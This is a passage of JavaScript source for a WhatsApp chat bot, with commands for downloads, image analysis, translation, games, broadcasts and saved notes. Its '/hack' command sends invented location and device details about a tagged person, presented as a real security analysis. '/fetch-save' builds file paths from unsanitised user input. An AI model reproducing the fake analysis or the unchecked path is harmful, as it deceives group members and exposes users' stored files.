          if (!url) return sock.sendMessage(from, { text: "❌ Please provide Facebook URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading Facebook video..." });
          try {
            // Using getfbstuff API
            const { data } = await axios.get(`https://getfbstuff.com/api/v1/video?url=${encodeURIComponent(url)}`);
            const videoUrl = data?.video?.url || data?.url;
            if (!videoUrl) throw new Error("Could not extract video URL");

            return sock.sendMessage(from, { video: { url: videoUrl }, caption: "✅ Downloaded from Facebook" });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Facebook Download Failed: ${e.message}` });
          }
        }

        if (cmd.startsWith("/anime ")) {
          const query = body.slice(7).trim();
          if (!query) return sock.sendMessage(from, { text: "❌ Please provide an anime title. Example: /anime Naruto" });

          await sock.sendMessage(from, { text: "⏳ Searching anime info..." });
          try {
            const { data } = await axios.get("https://api.jikan.moe/v4/anime", {
              params: {
                q: query,
                limit: 1
              },
              timeout: 20000
            });

            const anime = data?.data?.[0];
            if (!anime) throw new Error("No results found");

            const animeText = `🎬 *${anime.title}*

⭐ Score: ${anime.score || "N/A"}
📺 Episodes: ${anime.episodes || "N/A"}
📍 Status: ${anime.status || "N/A"}
🗓️ Year: ${anime.year || "N/A"}
🔗 MAL: ${anime.url}

📝 Synopsis:
${anime.synopsis ? anime.synopsis.slice(0, 500) + (anime.synopsis.length > 500 ? "..." : "") : "No synopsis available."}`;

            if (anime.images?.jpg?.image_url) {
              return sock.sendMessage(from, {
                image: { url: anime.images.jpg.image_url },
                caption: animeText
              });
            }

            return sock.sendMessage(from, { text: animeText });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Anime Search Failed: ${e?.message || "No results found."}` });
          }
        }

        if (cmd.startsWith("/spotifydl ")) {
          const url = body.slice(11).trim();
          if (!url) return sock.sendMessage(from, { text: "❌ Please provide Spotify URL" });

          await sock.sendMessage(from, { text: "⏳ Downloading Spotify track..." });
          try {
            // Spotify tracks require premium API access
            return sock.sendMessage(from, { text: "❌ Spotify downloads currently restricted by Spotify's terms of service." });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Spotify Download Failed: ${e.message}` });
          }
        }

        if (cmd.startsWith("/apkdl ")) {
          const appName = body.slice(7).trim();
          if (!appName) return sock.sendMessage(from, { text: "❌ Please provide app name to download" });

          await sock.sendMessage(from, { text: `⏳ Searching for ${appName}...` });
          try {
            // Using APKCombo API
            const { data } = await axios.get(`https://apkcombo.org/api/v1/search?q=${encodeURIComponent(appName)}`);
            if (!data.items?.length) throw new Error("App not found");
            
            const appUrl = data.items[0].download_url;
            if (!appUrl) throw new Error("Could not find APK URL");

            return sock.sendMessage(from, { document: { url: appUrl }, mimetype: "application/vnd.android.package-archive", fileName: `${appName}.apk` });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ APK Download Failed: App not found` });
          }
        }

        // --- PROFESSIONAL FEATURES ---
        if (cmd.startsWith("/analyze") || cmd.startsWith("/vision")) {
          try {
             // Extract any specific questions the user asks about the image
             const customPrompt = body.slice(cmd.split(" ")[0].length).trim() || "Carefully analyze this image in detail. Describe exactly what is in it, translate any text you see, and solve any problems present.";
             
             let imgMsg = msg.imageMessage;
             if (!imgMsg && msg.extendedTextMessage?.contextInfo?.quotedMessage?.imageMessage) {
                 imgMsg = msg.extendedTextMessage.contextInfo.quotedMessage.imageMessage;
             }

             if (!imgMsg) {
                 return sock.sendMessage(from, { text: "❌ Please send an image with the caption /analyze or reply to an image!" });
             }

             if (GEMINI_API_KEY === "YOUR_GEMINI_API_KEY") {
                 return sock.sendMessage(from, { text: "❌ **VISION SYSTEM OFFLINE** ❌\n\nThe Bot Owner needs to put their free Gemini API Key inside `index.js` (around line 32) to use Vision AI!\n\nGet it free here: https://aistudio.google.com" });
             }

             await sock.sendMessage(from, { text: "👁️ *Vision System Activated*\n\nAnalyzing image parameters... please wait." });

             const stream = await downloadContentFromMessage(imgMsg, "image");
             let buffer = Buffer.from([]);
             for await (const c of stream) buffer = Buffer.concat([buffer, c]);
             
             const base64Image = buffer.toString("base64");

             const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${GEMINI_API_KEY}`;
             const { data } = await axios.post(url, {
               contents: [{
                 parts: [
                   { text: customPrompt },
                   {
                     inline_data: {
                       mime_type: "image/jpeg",
                       data: base64Image
                     }
                   }
                 ]
               }]
             }, { headers: { "Content-Type": "application/json" } });

             const analysis = data.candidates[0].content.parts[0].text;
             return sock.sendMessage(from, { text: `🧠 *IMAGE ANALYSIS*\n\n${analysis}` }, { quoted: m });
          } catch (e) {
             console.error("Vision Error:", e.response?.data || e.message);
             return sock.sendMessage(from, { text: `❌ Analysis Failed: Ensure your API key is correct or try another picture.` });
          }
        }

        if (cmd.startsWith("/translate ") || cmd.startsWith("/tr ")) {
          const args = body.slice(body.indexOf(" ") + 1).trim().split(" ");
          if (args.length < 2) return sock.sendMessage(from, { text: "❌ Proper Format: /translate [lang_code] [text]\nExample: /translate es Hello world" });

          const targetLang = args[0];
          const query = args.slice(1).join(" ");
          
          await sock.sendMessage(from, { text: "⏳ Translating..." });
          try {
            const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=${targetLang}&dt=t&q=${encodeURIComponent(query)}`;
            const { data } = await axios.get(url);
            const translatedText = data[0].map(item => item[0]).join("");
            
            return sock.sendMessage(from, { text: `🌍 *DEMONIC TRANSLATOR*\n\nText: ${query}\nTranslation: ${translatedText}` }, { quoted: m });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Translate Error: Invalid Language Code or Server Down` });
          }
        }

          if (cmd === "/fact") {
           try {
             const { data } = await axios.get(`https://uselessfacts.jsph.pl/random.json?language=en`);
             const fact = data && (data.text || data?.data?.text) ? (data.text || data.data.text) : null;
             if (!fact) throw new Error('Invalid response');
             return sock.sendMessage(from, { text: `🧠 *RANDOM FACT*\n\n${fact}` }, { quoted: m });
           } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch a fact.` });
           }
          }

        if (cmd.startsWith("/tts ") || cmd.startsWith("/say ")) {
          const text = body.slice(body.indexOf(" ") + 1).trim();
          if (!text) return sock.sendMessage(from, { text: "❌ Provide text to speak!\nExample: /tts Hello everyone!" });
          
          try {
            const url = `https://translate.google.com/translate_tts?ie=UTF-8&tl=en&client=tw-ob&q=${encodeURIComponent(text.slice(0, 200))}`;
            return sock.sendMessage(from, { audio: { url: url }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
          } catch (e) {
            return sock.sendMessage(from, { text: `❌ Failed to generate speech.` });
          }
        }

        if (cmd === "/meme") {
          try {
             await sock.sendMessage(from, { text: "⏳ Getting meme..." });
             const { data } = await axios.get(`https://meme-api.com/gimme`);
             return sock.sendMessage(from, { image: { url: data.url }, caption: `😂 *MEME*\n\n${data.title}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch meme.` });
          }
        }

        if (cmd.startsWith("/lyrics ")) {
          const song = body.slice(8).trim();
          if (!song) return sock.sendMessage(from, { text: "❌ Provide a song name!\nExample: /lyrics Hello by Adele" });
          
          await sock.sendMessage(from, { text: "⏳ Searching lyrics..." });
          try {
             // Using alternative lyrics API
             const { data } = await axios.get(`https://api.genius.com/search?q=${encodeURIComponent(song)}&access_token=YOUR_GENIUS_TOKEN`);
             if (!data.response.hits.length) throw new Error("Lyrics not found.");
             const url = data.response.hits[0].result.url;
             return sock.sendMessage(from, { text: `🎶 *LYRICS FOUND*\n\nSong: ${data.response.hits[0].result.title}\nArtist: ${data.response.hits[0].result.primary_artist.name}\n\nView here: ${url}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Lyrics not found. This feature requires a Genius API token.` });
          }
        }

        if (cmd.startsWith("/define ") || cmd.startsWith("/dict ")) {
          const word = body.slice(body.indexOf(" ") + 1).trim();
          if (!word) return sock.sendMessage(from, { text: "❌ Provide a word to define!\nExample: /define serendipity" });
          try {
             const { data } = await axios.get(`https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`);
             const meaning = data[0].meanings[0].definitions[0].definition;
             const example = data[0].meanings[0].definitions[0].example || "No example provided.";
             return sock.sendMessage(from, { text: `📖 *DICTIONARY*\n\n*Word:* ${data[0].word}\n*Definition:* ${meaning}\n*Example:* ${example}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Word not found in the dictionary.` });
          }
        }

        if (cmd === "/advice") {
          try {
             const { data } = await axios.get(`https://api.adviceslip.com/advice`);
             return sock.sendMessage(from, { text: `💡 *ADVICE*\n\n${data.slip.advice}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch advice.` });
          }
        }

        if (cmd.startsWith("/calc ")) {
          const expression = body.slice(6).trim();
          if (!expression) return sock.sendMessage(from, { text: "❌ Provide a math expression!\nExample: /calc 5 * 10 + 2" });
          try {
             const { data } = await axios.get(`https://api.mathjs.org/v4/?expr=${encodeURIComponent(expression)}`);
             return sock.sendMessage(from, { text: `🧮 *CALCULATOR*\n\n*Equation:* ${expression}\n*Result:* ${data}` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Invalid math expression.` });
          }
        }

        if (cmd === "/cat") {
          try {
             const { data } = await axios.get(`https://api.thecatapi.com/v1/images/search`);
             return sock.sendMessage(from, { image: { url: data[0].url }, caption: `🐱 *MEOW*` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch cat.` });
          }
        }

        if (cmd === "/dog") {
          try {
             const { data } = await axios.get(`https://dog.ceo/api/breeds/image/random`);
             return sock.sendMessage(from, { image: { url: data.message }, caption: `🐶 *WOOF*` }, { quoted: m });
          } catch (e) {
             return sock.sendMessage(from, { text: `❌ Failed to fetch dog.` });
          }
        }

        if (cmd === "/truth") {
            const truths = ["When was the last time you lied?", "What is your biggest fear?", "What is your worst habit?", "Who is your crush?", "Have you ever cheated on a test?", "What's the most embarrassing thing you've done?", "Who in this group do you like the most?", "What is your biggest secret?"];
            const t = truths[Math.floor(Math.random() * truths.length)];
            return sock.sendMessage(from, { text: `❔ *TRUTH*\n\n${t}` }, { quoted: m });
        }

        if (cmd === "/dare") {
            const dares = ["Send a voice note singing your favorite song.", "Change your profile picture to a funny meme for 1 hour.", "Message your crush right now.", "Do 10 pushups and send a video.", "Let the group choose your status for 24 hours.", "Speak in a fake accent for the next 5 messages.", "Send the 5th picture in your gallery.", "Confess something weird to the group."];
            const d = dares[Math.floor(Math.random() * dares.length)];
            return sock.sendMessage(from, { text: `🔥 *DARE*\n\n${d}` }, { quoted: m });
        }

        if (cmd === "/ownerinfo") {
          const contact = {
            displayName: "Owner",
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Demon Alex\nORG:Demonic Bot CEO;\nTEL;type=CELL;type=VOICE;waid=2349054345858:+234 905 434 5858\nEND:VCARD`
          };
          return sock.sendMessage(from, { contacts: { displayName: "Demon Alex", contacts: [contact] } });
        }

        if (cmd === "/server") {
          const os = require('os');
          const uptime = process.uptime();
          const days = Math.floor(uptime / (3600 * 24));
          const hours = Math.floor((uptime % (3600 * 24)) / 3600);
          const minutes = Math.floor((uptime % 3600) / 60);
          
          let text = `🖥️ *DEMONIC SERVER STATS*\n\n`;
          text += `*Platform:* ${os.type()} ${os.release()}\n`;
          text += `*Architecture:* ${os.arch()}\n`;
          text += `*RAM Used:* ${(process.memoryUsage().rss / 1024 / 1024).toFixed(2)} MB\n`;
          text += `*Bot Uptime:* ${days}d ${hours}h ${minutes}m\n`;
          text += `*Version:* v${VERSION}\n`;
          text += `*Engine:* Node.js ${process.version}`;
          return sock.sendMessage(from, { text }, { quoted: m });
        }

        if (cmd === "/nexchat") {
          return sock.sendMessage(from, {
            text: `🌐 *NEXCHAT WEB APP*\n\nAccess the Nexchat Web Application here:\n👉 https://nexchatweb-app.netlify.app/`
          }, { quoted: m });
        }

        if (cmd.startsWith("/setownerinfo ") && isOwner(sender)) {
          const ownerData = body.slice(14).trim();
          if (!ownerData) return sock.sendMessage(from, { text: "❌ Provide owner info!\nFormat: /setownerinfo Name|Number|Organization" });
          
          const parts = ownerData.split("|");
          const ownerName = parts[0]?.trim() || "Owner";
          const ownerPhone = parts[1]?.trim() || "N/A";
          const ownerOrg = parts[2]?.trim() || "Demonic Bot";
          
          const contact = {
            displayName: ownerName,
            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nORG:${ownerOrg};\nTEL;type=CELL;type=VOICE;waid=${ownerPhone.replace(/[^0-9]/g, "")}:${ownerPhone}\nEND:VCARD`
          };
          
          return sock.sendMessage(from, { 
            text: `✅ Owner info updated!\n\n*Name:* ${ownerName}\n*Phone:* ${ownerPhone}\n*Organization:* ${ownerOrg}`,
            contacts: { displayName: ownerName, contacts: [contact] }
          });
        }

        if (cmd.startsWith("/broadcast ") && isOwner(sender)) {
          const bmsg = body.slice(11).trim();
          if (!bmsg) return sock.sendMessage(from, { text: "❌ Provide a message to broadcast!" });
          
          await sock.sendMessage(from, { text: "⏳ Broadcasting message..." });
          try {
             const chats = await sock.groupFetchAllParticipating();
             const allGroups = Object.values(chats).map(v => v.id);
             for (let jid of allGroups) {
                 await sock.sendMessage(jid, { text: `📢 *DEMONIC BROADCAST*\n\n${bmsg}` });
                 await new Promise(r => setTimeout(r, 1000)); // anti-spam delay
             }
             return sock.sendMessage(from, { text: `✅ Successfully broadcasted to ${allGroups.length} groups!` });
          } catch(e) {
             return sock.sendMessage(from, { text: `❌ Broadcast failed.` });
          }
        }

        if (cmd.startsWith("/app")) {
          const parts = body.slice(5).trim().split("|");
          const appName = parts[0]?.trim();
          const themeIndex = parts[1]?.trim();

          if (!appName || !themeIndex) {
              return sock.sendMessage(from, { text: `💻 *DEMONIC APP BUILDER*\n\nBuild your own custom HTML Web App instantly!\n\n*Format:* /app [AppName] | [ThemeNumber]\n*Example:* /app DemoMusic | 1\n\n*🎨 THEMES AVALIABLE:*\n1️⃣ Neon Green & Chill Lofi\n2️⃣ Demon Red & Aggressive Phonk\n3️⃣ Cyber Blue & Classical Piano` }, { quoted: m });
          }
          
          await sock.sendMessage(from, { text: `💻 *COMPILING APP...*\n\nBuilding UI for [${appName}] on Theme ${themeIndex}... please wait a moment.` });

          let themeBg, themeColor, trackUrl, emoji;
          if (themeIndex === "1") {
              themeBg = "linear-gradient(145deg, #1f1f27, #131318)"; themeColor = "#00FF87";
              trackUrl = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3";
              emoji = "✨";
          } else if (themeIndex === "2") {
              themeBg = "linear-gradient(145deg, #2a0808, #110000)"; themeColor = "#ff3333";
              trackUrl = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3";
              emoji = "🔥";
          } else {
              themeBg = "linear-gradient(145deg, #0a192f, #020c1b)"; themeColor = "#64ffda";
              trackUrl = "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3";
              emoji = "💎";
          }

          const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>${appName}</title>
    <style>
        body { margin: 0; padding: 0; background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .player-container { background: ${themeBg}; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 80%; max-width: 350px; border-top: 2px solid ${themeColor}; }
        h1 { color: ${themeColor}; text-shadow: 0 0 10px ${themeColor}aa; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 2px; }
        p { color: #aaa; font-size: 14px; margin-bottom: 30px; letter-spacing: 1px; }
        .disc { width: 140px; height: 140px; border-radius: 50%; background: #111; border: 4px solid ${themeColor}; margin: 0 auto 30px auto; animation: spin 4s linear infinite; box-shadow: 0 0 25px ${themeColor}55; }
        .disc-center { width: 30px; height: 30px; border-radius: 50%; background: #050505; margin: 55px auto; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        button { background: ${themeColor}; color: #000; border: none; padding: 15px 30px; border-radius: 25px; font-weight: 900; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 15px ${themeColor}88; text-transform: uppercase; }
        button:hover { transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="player-container">
        <div class="disc"><div class="disc-center"></div></div>
        <h1>${appName}</h1>
        <p>Premium Audio Engine ${emoji}</p>
        <button id="playBtn" onclick="togglePlay()">▶ PLAY DEMO</button>
        <audio id="audioElement" loop>
            <source src="${trackUrl}" type="audio/mpeg">
        </audio>
    </div>
    <script>
        let isPlaying = false;
        let audio = document.getElementById("audioElement");
        let btn = document.getElementById("playBtn");
        function togglePlay() {
            if(isPlaying) { audio.pause(); btn.innerHTML = "▶ PLAY DEMO"; btn.style.background = "${themeColor}"; btn.style.color = "#000"; }
            else { audio.play(); btn.innerHTML = "⏸ PAUSE AUDIO"; btn.style.background = "#fff"; btn.style.color = "#000"; }
            isPlaying = !isPlaying;
        }
    </script>
</body>
</html>`;
          
          try {
             const os = require('os');
             const tempPath = require('path').join(os.tmpdir(), `${appName.replace(/[^a-zA-Z0-9]/g, '')}.html`);
             require('fs').writeFileSync(tempPath, htmlContent);
             
             await sock.sendMessage(from, { 
                document: require('fs').readFileSync(tempPath), 
                mimetype: "text/html", 
                fileName: `${appName}.html`,
                caption: `✅ *APP COMPILED SUCCESSFULLY!*\n\nDownload and open the HTML file above to run your personal Music Web App!`
             }, { quoted: m });
             
             setTimeout(() => { if (require('fs').existsSync(tempPath)) require('fs').unlinkSync(tempPath); }, 5000);
          } catch(e) {
             return sock.sendMessage(from, { text: "❌ Failed to compile App." });
          }
        }

        if (cmd.startsWith("/afk")) {
          const reason = body.slice(4).trim() || "Busy";
          AFK_STORE[sender] = { reason, startTime: Date.now() };
          return sock.sendMessage(from, {
            text: `😴 *AFK MODE ACTIVATED*\n\nReason: ${reason}\n\nI'll notify anyone who tags you! 👋`
          });
        }

        if (cmd.startsWith("/wiki ")) {
          const query = body.slice(6).trim();
          if (!query) return sock.sendMessage(from, { text: "❌ Provide a search term!" });
          try {
            const url = `https://en.wikipedia.org/api/rest_v1/page/summary/${encodeURIComponent(query)}`;
            const { data } = await axios.get(url);
            const title = data.title;
            const summary = data.extract;
            const image = data.thumbnail?.source;

            if (image) {
              await sock.sendMessage(from, { image: { url: image }, caption: `📚 *${title}*\n\n${summary}` });
            } else {
              await sock.sendMessage(from, { text: `📚 *${title}*\n\n${summary}` });
            }
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ No wikipedia article found." });
          }
        }

        if (cmd.startsWith("/github ")) {
          const user = body.slice(8).trim();
          if (!user) return sock.sendMessage(from, { text: "❌ Provide a username!" });
          try {
            const { data } = await axios.get(`https://api.github.com/users/${user}`);
            return sock.sendMessage(from, {
              image: { url: data.avatar_url },
              caption: `🐙 *GITHUB PROFILE*\n\n👤 Name: ${data.name || user}\n📜 Bio: ${data.bio || "None"}\n📦 Repos: ${data.public_repos}\n👥 Followers: ${data.followers}\n🔗 Link: ${data.html_url}`
            });
          } catch (e) {
            return sock.sendMessage(from, { text: "❌ User not found." });
          }
        }

        if (cmd.startsWith("/hack ") && isGroup) {
          const target = parseTarget(body, m);
          if (!target) return sock.sendMessage(from, { text: "❌ Mention a user to analyze or provide a number!" });

          await sock.sendMessage(from, { text: `🔍 *SECURITY ANALYSIS INITIATED*\n\nAnalyzing @${target.split("@")[0]}...` });

          const deviceTypes = ["iPhone 14 Pro", "Samsung Galaxy S23", "OnePlus 11", "Xiaomi 13"];
          const osTypes = ["iOS 17.2", "Android 13", "Android 14"];
          const securityScores = [45, 62, 78, 85, 92];
          const locations = ["Lagos, Nigeria", "Accra, Ghana", "Nairobi, Kenya", "Cairo, Egypt"];
          const descriptions = [
            "Tech enthusiast and coder",
            "Social media analyst",
            "Content creator",
            "Business entrepreneur",
            "Software developer",
            "Digital marketer",
            "Graphic designer",
            "Student"
          ];
          const lastSeenTimes = [
            "2 minutes ago",
            "15 minutes ago",
            "1 hour ago",
            "3 hours ago",
            "Yesterday",
            "2 days ago",
            "1 week ago",
            "Online now"
          ];

          const randomDevice = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
          const randomOS = osTypes[Math.floor(Math.random() * osTypes.length)];
          const randomScore = securityScores[Math.floor(Math.random() * securityScores.length)];
          const randomLocation = locations[Math.floor(Math.random() * locations.length)];
          const randomDescription = descriptions[Math.floor(Math.random() * descriptions.length)];
          const randomLastSeen = lastSeenTimes[Math.floor(Math.random() * lastSeenTimes.length)];
          const randomUsername = `user_${Math.floor(Math.random() * 9999)}`;

          const steps = [
            `👤 *Username:* ${randomUsername}`,
            `📝 *Description:* ${randomDescription}`,
            `👁️ *Last Seen:* ${randomLastSeen}`,
            `📱 *Device:* ${randomDevice}`,
            `🖥️ *OS:* ${randomOS}`,
            `🔐 *Security Score:* ${randomScore}/100`,
            `📍 *Last Location:* ${randomLocation}`,
            `⏱️ *Last Active:* ${Math.floor(Math.random() * 60)} min ago`,
            `💾 *Storage Used:* ${Math.floor(Math.random() * 100)}%`,
            `🔋 *Battery:* ${Math.floor(Math.random() * 100)}%`
          ];

          for (const step of steps) {
            await new Promise(r => setTimeout(r, 800));
            await sock.sendMessage(from, { text: step });
          }

          let resultText = `✅ *SECURITY ANALYSIS COMPLETE*\n\n`;
          resultText += `*Target:* @${target.split("@")[0]}\n`;
          resultText += `*Username:* ${randomUsername}\n`;
          resultText += `*Description:* ${randomDescription}\n`;
          resultText += `*Last Seen:* ${randomLastSeen}\n`;
          resultText += `*Device:* ${randomDevice}\n`;
          resultText += `*Operating System:* ${randomOS}\n`;
          resultText += `*Security Score:* ${randomScore}/100\n`;
          resultText += `*Last Known Location:* ${randomLocation}\n\n`;
          
          if (randomScore >= 85) {
            resultText += `🟢 *Status:* Secure\n*Recommendation:* Strong security measures detected`;
          } else if (randomScore >= 65) {
            resultText += `🟡 *Status:* Moderate\n*Recommendation:* Consider updating security protocols`;
          } else {
            resultText += `🔴 *Status:* At Risk\n*Recommendation:* Urgent security updates required`;
          }

          return sock.sendMessage(from, { text: resultText });
        }



        if (cmd === "/join-channel") {
          return sock.sendMessage(from, {
            text: `📢 *JOIN CHANNEL*\n\nStay updated with latest news!\n\n✨ WHY JOIN?\n├─ Latest bot updates\n├─ Feature announcements\n├─ Tips & tutorials\n└─ Community news\n\n🔗 *LINK:* ${CHANNEL}`
          }, { quoted: m });
        }

        if (cmd === "/join-group") {
          return sock.sendMessage(from, {
            text: `👥 *JOIN COMMUNITY GROUP*\n\nConnect with other users!\n\n🎉 IN THIS GROUP:\n├─ Chat with other users\n├─ Share your experience\n├─ Get instant support\n├─ Exchange tips & tricks\n└─ Join fun challenges\n\n🔗 *LINK:* ${GROUP_LINK}`
          }, { quoted: m });
        }

        if (cmd.startsWith("/save-txt")) {
          const args = body.trim().split(/\s+/).slice(1);
          const key = args.shift() || `save-${Date.now()}`;
          const quotedText = msg.extendedTextMessage?.contextInfo?.quotedMessage?.conversation || "";
          const text = args.join(' ').trim() || quotedText;

          if (!text) {
            return sock.sendMessage(from, {
              text: `❌ Usage: /save-txt <name> [text]\nExample: /save-txt hello This is a saved note.\nOr reply to a message with /save-txt hello`,
            }, { quoted: m });
          }

          await sendLoadingStatus(from);
          const safeName = sanitizeSaveName(key);
          const userFolder = getUserSaveFolder(sender);
          const fileName = safeName.endsWith('.txt') ? safeName : `${safeName}.txt`;
          let filePath = path.join(userFolder, fileName);
          if (fs.existsSync(filePath)) {
            const timestamp = Date.now();
            filePath = path.join(userFolder, `${safeName}-${timestamp}.txt`);
          }
          fs.writeFileSync(filePath, text, 'utf8');

          return sock.sendMessage(from, {
            text: `✅ Saved! Your text has been saved as *${path.basename(filePath)}* in your personal saves folder.\nUse /fetch-save ${path.basename(filePath)} to retrieve it later.`,
          }, { quoted: m });
        }

        if (cmd.startsWith("/fetch-save") || cmd.startsWith("/fetch-save.txt")) {
          const args = body.trim().split(/\s+/).slice(1);
          const query = args.join(' ').trim();
          const userFolder = getUserSaveFolder(sender);

          if (!fs.existsSync(userFolder)) {
            return sock.sendMessage(from, { text: "❌ You have no saved files yet. Use /save-txt <name> [text] to save one." }, { quoted: m });
          }

          const files = fs.readdirSync(userFolder).filter((f) => f.endsWith('.txt'));
          if (!query) {
            if (!files.length) {
              return sock.sendMessage(from, { text: "❌ No saved files found. Use /save-txt to create one." }, { quoted: m });
            }
            return sock.sendMessage(from, { text: `📁 Your saved files:\n${files.map((f) => `- ${f}`).join('\n')}\n\nUse /fetch-save <filename> to get one.` }, { quoted: m });
          }

          const requested = query.endsWith('.txt') ? query : `${query}.txt`;
          const filePath = path.join(userFolder, requested);
          if (!fs.existsSync(filePath)) {
            const matching = files.find((f) => f.toLowerCase().includes(query.toLowerCase()));
            if (matching) {
              return sock.sendMessage(from, { text: `❌ Exact file not found. Did you mean *${matching}*? Use /fetch-save ${matching}` }, { quoted: m });
            }
            return sock.sendMessage(from, { text: `❌ File not found: ${requested}.\nUse /fetch-save to list saved files.` }, { quoted: m });
          }

          await sendLoadingStatus(from);
          const content = fs.readFileSync(filePath, 'utf8');
          if (content.length > 1200) {
            const buffer = Buffer.from(content, 'utf8');
            return sock.sendMessage(from, {
              document: buffer,
              fileName: path.basename(filePath),
              mimetype: 'text/plain',
            }, { quoted: m });
          }

          return sock.sendMessage(from, {
            text: `📄 *Fetched:* ${path.basename(filePath)}\n\n${content}`,
          }, { quoted: m });
        }

        if (cmd === "/list-saves") {
          const userFolder = getUserSaveFolder(sender);
          if (!fs.existsSync(userFolder)) {
            return sock.sendMessage(from, { text: "❌ You have no saved files yet. Use /save-txt <name> [text] to save one." }, { quoted: m });
          }
          const files = fs.readdirSync(userFolder).filter((f) => f.endsWith('.txt'));
          if (!files.length) {
            return sock.sendMessage(from, { text: "❌ You have no saved files yet." }, { quoted: m });
          }
          return sock.sendMessage(from, { text: `📁 Your saved files:\n${files.map((f) => `- ${f}`).join('\n')}\n\nUse /fetch-save <filename> to retrieve one.` }, { quoted: m });
        }

        if (cmd === "/links") {
          // Send message about why to follow
          await sock.sendMessage(from, {
            text: `🔗 *DEMONIC COMMUNITY LINKS*\n\n🔥 WHY FOLLOW US?\n├─ New features first\n├─ Exclusive updates\n├─ Direct support\n└─ Community events`,
            quoted: m
          });

          // Send interactive buttons for channel and group
          return sendMenuButtons(sock, from, CHANNEL, GROUP_LINK);
        }

        if (cmd === "/channels") {
          // Quick channel/group links display
          return sendCleanLinks(sock, from, CHANNEL, GROUP_LINK);
        }

        // /card command: display a URL as a preview card (image + title + description)
        if (cmd.startsWith("/card") || cmd.startsWith(`${PREFIX}card`)) {
          const args = body.split(/\s+/).slice(1);
          let url = args[0] || null;

          // Try to locate URL in the message body or quoted message
          if (!url) {
            const found = body.match(LINK_REGEX);
            if (found && found[0]) url = found[0];
            else {
              const quoted = msg.extendedTextMessage?.contextInfo?.quotedMessage?.conversation || "";
              const qFound = quoted.match(LINK_REGEX);
              if (qFound && qFound[0]) url = qFound[0];
            }
          }

          if (!url) {
            return sock.sendMessage(from, { text: `❌ Usage: ${PREFIX}card [url]\nExample: ${PREFIX}card https://example.com` }, { quoted: m });
          }

          if (!/^https?:\/\//i.test(url)) url = "https://" + url;

          const preview = await fetchLinkPreview(url);
          let thumb = null;
          if (preview.image) {
            try {
              const img = await axios.get(preview.image, { responseType: 'arraybuffer', timeout: 5000 });
              thumb = Buffer.from(img.data, 'binary');
            } catch (e) { thumb = null; }
          }

          const title = preview.title || url;
          const description = preview.description || "";
          const caption = `🔗 ${title}\n\n${description}\n\n${url}`;

          try {
            if (thumb) {
              await sock.sendMessage(from, {
                image: thumb,
                caption,
                contextInfo: { externalAdReply: { title, body: description, sourceUrl: url, thumbnail: thumb } }
              }, { quoted: m });
            } else {
              await sock.sendMessage(from, {
                text: caption,
                contextInfo: { externalAdReply: { title, body: description, sourceUrl: url } }
              }, { quoted: m });
            }
          } catch (err) {
            return sock.sendMessage(from, { text: `❌ Failed to create card: ${err.message}` }, { quoted: m });
          }
        }

        if ((cmd.startsWith("/link ") || cmd.startsWith("/pair ")) && isOwner(sender)) {
          const args = body.split(/\s+/).slice(1);
          const phoneNum = (args[0] || "").replace(/[^0-9]/g, "");
          if (phoneNum && phoneNum.length >= 10) {
            try {
              await sock.sendMessage(from, { text: `⏳ Generating pairing code for ${phoneNum}...\n\n🔄 Connecting to WhatsApp servers...\n⏳ This may take 10-20 seconds...` });
              
              const sessionBase = process.env.SESSION_DIR || path.join(__dirname, 'session');
              if (!fs.existsSync(sessionBase)) fs.mkdirSync(sessionBase, { recursive: true });
              const sessionPath = path.join(sessionBase, `session-${phoneNum}`);
              const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
              
              // Fetch latest version for proper pairing
              const { version } = await fetchLatestBaileysVersion();
              
              const tempSock = makeWASocket({
                auth: state,
                version,
                logger: P({ level: "silent" }),
                printQRInTerminal: false,
                browser: ["Ubuntu", "Chrome", "20.0.04"],
                connectTimeoutMs: 60000,
                defaultQueryTimeoutMs: 0
              });
              
              tempSock.ev.on("creds.update", saveCreds);
              
              // Wait for temp socket to connect using event-driven handler
              const waitTempConnected = (socketInstance, timeoutMs = 30000) => new Promise((resolve) => {
                let resolved = false;
                const handler = (u) => {
                  if (u.connection === 'open') {
                    if (!resolved) {
                      resolved = true;
                      try { socketInstance.ev.off('connection.update', handler); } catch (e) {}
                      resolve(true);
                    }
                  }
                };

                socketInstance.ev.on('connection.update', handler);
                setTimeout(() => {
                  if (!resolved) {
                    resolved = true;
